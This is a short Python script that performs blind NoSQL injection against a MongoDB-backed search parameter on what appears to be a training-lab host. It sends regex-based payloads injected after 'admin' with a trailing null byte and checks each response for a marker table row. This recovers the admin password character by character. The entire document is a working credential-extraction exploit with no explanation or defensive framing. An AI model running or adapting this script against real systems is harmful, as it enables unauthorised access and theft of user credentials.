import requests


target = "http://ptl-524b5f0f-595dbaf9.libcurl.so/?search="

characters = open('/opt/wordlists/a-z0-9', 'r')
char_list = [i.strip('\n') for i in characters]
char_list.remove("")
char_list.append("-")




def bruteMongo(found_chars=""):
    for char in char_list:
        print(f'TRYING: {char}')
        payload = f"admin'%20%26%26%20this.password.match(/^{found_chars}{char}.*$/)%00"
        print(f"TRYING PAYLOAD: {payload}")
        response = requests.get(target+payload)
        if '<tr><td><a href="?search=admin">admin</a></td></tr>' not in response.text:
            pass
        else:
            payload = f"admin'%20%26%26%20this.password.match(/^{found_chars}{char}$/)%00"
            response = requests.get(target+payload)
            if '<tr><td><a href="?search=admin">admin</a></td></tr>' in response.text:
                return found_chars + char
            else:
                for i in range(3):
                    print('STARTING RECURSION')
                    print('STARTING RECURSION')
                return bruteMongo(found_chars + char)


print(char_list)
password = bruteMongo()
print(f"\n\nFOUND PASSWORD: {password}")